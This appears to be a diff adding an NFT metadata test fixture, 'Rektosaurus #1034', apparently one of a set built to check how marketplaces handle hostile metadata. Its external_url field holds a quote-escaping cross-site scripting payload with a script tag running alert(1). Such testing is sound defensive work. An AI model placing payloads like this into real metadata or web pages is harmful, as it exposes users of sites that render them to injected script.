@@ -1,0 +1,6 @@
+{
+  "name": "Rektosaurus #1034 [external_url escape quote]", 
+  "description": "-", 
+  "external_url": "\"><script>alert(1);</script>", 
+  "image": "https://rex.rektosaurus.io/rektosaurus.png"
+}
